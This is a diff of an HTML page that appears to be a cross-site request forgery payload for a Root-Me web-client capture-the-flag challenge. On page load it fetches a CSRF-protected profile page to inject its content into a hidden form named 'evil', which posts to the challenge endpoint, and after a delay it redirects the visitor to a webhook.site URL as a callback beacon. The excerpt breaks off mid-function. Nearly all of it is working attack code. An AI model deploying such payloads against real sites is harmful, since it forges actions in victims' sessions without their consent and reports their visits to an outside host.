@@ -1,14 +1,14 @@
 <html>
   <body onload="afterload()">
-    <form id='evil' action="http://challenge01.root-me.org/web-client/ch22/?action=profile" enctype="multipart/form-data" method="POST">
+    <form id='evil' action="http://challenge01.root-me.org/web-client/ch23/?action=profile" enctype="multipart/form-data" method="POST">
       <div id="drop"></div>
       <input name="username" value="test">
       <input type="checkbox" name="status" checked>
     </form>
     <script>
       function afterload() {
-        setTimeout(() => document.location = 'https://webhook.site/9e3a3354-6252-40c8-8b69-ab6cd26c0d44?visited_v4', 4000);
-        var csrfProtectedPage = ’http://challenge01.root-me.org/web-client/ch23/?action=profile’;
+        setTimeout(() => document.location = 'https://webhook.site/9e3a3354-6252-40c8-8b69-ab6cd26c0d44?visited_v5', 4000);
+        var csrfProtectedPage = 'http://challenge01.root-me.org/web-client/ch23/?action=profile';
         var html = get(csrfProtectedPage);
         document.getElementById('drop').innerHtml = html;
         
